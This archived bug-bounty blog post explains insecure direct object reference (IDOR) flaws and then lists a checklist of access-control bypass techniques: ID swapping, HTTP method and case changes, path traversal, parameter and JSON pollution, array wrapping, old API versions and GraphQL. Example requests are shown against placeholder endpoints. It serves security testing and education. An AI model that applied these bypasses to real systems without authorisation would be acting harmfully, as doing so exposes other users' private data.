# What is IDOR (along with IDOR Attack Method)

- **Source URL:** https://medium.com/@errorfiathck/what-is-idor-along-with-idor-attack-method-e183b28e8546?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20240817020843/https://medium.com/@errorfiathck/what-is-idor-along-with-idor-attack-method-e183b28e8546
- **Fetched:** 2026-11-23
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/6765 (id 6765)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# What is IDOR (along with IDOR Attack Method)

# What are Insecure Direct Object References or IDORs?

An IDOR vulnerability is a rights control problem that occurs when a direct reference to an object (files, personal information, etc.) is controllable by the user.

Often, this type of vulnerability allows horizontal granting of privileges (i.e. access to information of users with the same rights) and, in rarer cases, escalation of privileges.

As an example, let’s consider the case of a SaaS application that includes invoice read and write functions, with predefined access and thus user rights.

The term IDOR became popular with its appearance at OWASP 2007. However, this is just one example of many access control implementation mistakes that can lead to bypassing access controls.

Now imagine that rights controls are misconfigured, allowing a user to access (read and/or write) the bills of other application users simply by changing the URL.

Indeed, the user could consult one of his invoices via the following URL:

`https://www.example.com/invoices/002546`
And then, with or without the help of a tool, he can change the URL parameters. It should be noted that this type of exploitation is very easy with the brute force tool, for example due to the speed and configuration of the parameters, which is not much to explain (at least no one can do brute force).

Let’s take the simplest case here for example, changing your invoice ID:

`https://www.example.com/invoices/002746`
If this file actually exists in the database (via this ID) and we haven’t looked for anything and no legal checks have been done, we can be happy because this is called an IDOR. In fact, the impact of this type of vulnerability can be critical depending on the sensitivity of the data.

# IDOR Attack Method:

**Base Step:**

1. Create two accounts if possible or else enumerate users first.
2. Check if the endpoint is private or public and does it contains any kind of id param.
3. Try changing the param value to some other user and see if does anything to their account.
4. Done !!

\[ \] \[ \] image profilie \[ \] delete acount \[ \] infromation acount \[ \] VIEW & DELETE & Create api\_key \[ \] allows to read any comment \[ \] change price \[ \] chnage the coin from dollar to uaro \[ \] Try decode the ID, if the ID encoded using md5,base64,etc

GET /GetUser/dmljdGltQG1haWwuY29t \[…\]


\[ \] change HTTP method

GET /users/delete/victim\_id ->403

POST /users/delete/victim\_id ->200


\[ \] Try replacing parameter names

Instead of this:

GET /api/albums?album\_id= \<album id>

Try This:

GET /api/albums?account\_id= \<account id>

Tip: There is a Burp extension called Paramalyzer which will help with this by remembering all the parameters you have passed to a host.


\[ \] Path Traversal

POST /users/delete/victim\_id ->403

POST /users/delete/my\_id/..victim\_id ->200


\[ \] change request content-type

Content-Type: application/xml ->

Content-Type: application/json


\[ \] swap non-numeric with numeric id

GET /file?id=90djbkdbkdbd29dd

GET /file?id=302


\[ \] Missing Function Level Acess Control

GET /admin/profile ->401

GET /Admin/profile ->200

GET /ADMIN/profile ->200

GET /aDmin/profile ->200

GET /adMin/profile ->200

GET /admIn/profile ->200

GET /admiN/profile ->200


\[ \]send wildcard instead of an id

GET /api/users/user\_id ->

GET /api/users/\*


\[ \] Never ignore encoded/hashed ID

for hashed ID ,create multiple accounts and understand the ppattern application users to allot an iD


\[ \] Google Dorking/public form

search all the endpoints having ID which the search engine may have already indexed


\[ \] Bruteforce Hidden HTTP parameters

use tools like arjun , paramminer


\[ \] Bypass object level authorization Add parameter onto the endpoit if not present by defualt

GET /api\_v1/messages ->200

GET /api\_v1/messages?user\_id=victim\_uuid ->200


\[ \] HTTP Parameter POllution Give mult value for same parameter

GET /api\_v1/messages?user\_id=attacker\_id&user\_id=victim\_id

GET /api\_v1/messages?user\_id=victim\_id&user\_id=attacker\_id


\[ \] change file type

GET /user\_data/2341 -> 401

GET /user\_data/2341.json -> 200

GET /user\_data/2341.xml -> 200

GET /user\_data/2341.config -> 200

GET /user\_data/2341.txt -> 200


\[ \] json parameter pollution

{“userid”:1234,”userid”:2542}


\[ \] Wrap the ID with an array in the body

{“userid”:123} ->401

{“userid”:\[123\]} ->200


\[ \] wrap the id with a json object

{“userid”:123} ->401

{“userid”:{“userid”:123}} ->200


\[ \] Test an outdata API version

GET /v3/users\_data/1234 ->401

GET /v1/users\_data/1234 ->200


\[ \] If the website using graphql, try to find IDOR using graphql!

GET /graphql

\[…\]

GET /graphql.php?query=

\[…\]


have a nice time .
